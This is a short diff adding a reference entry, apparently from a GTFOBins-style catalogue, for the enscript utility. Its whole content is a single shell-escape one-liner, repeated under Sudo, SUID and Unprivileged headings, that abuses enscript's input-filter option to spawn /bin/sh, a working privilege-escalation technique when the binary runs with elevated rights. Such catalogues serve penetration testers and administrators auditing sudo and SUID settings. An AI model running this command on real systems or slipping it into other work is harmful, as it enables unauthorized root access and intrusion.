@@ -1,0 +1,14 @@
+enscript
+========
+
+Shell
+-----
+
+[Sudo]
+    enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
+
+[SUID]
+    enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
+
+[Unprivileged]
+    enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
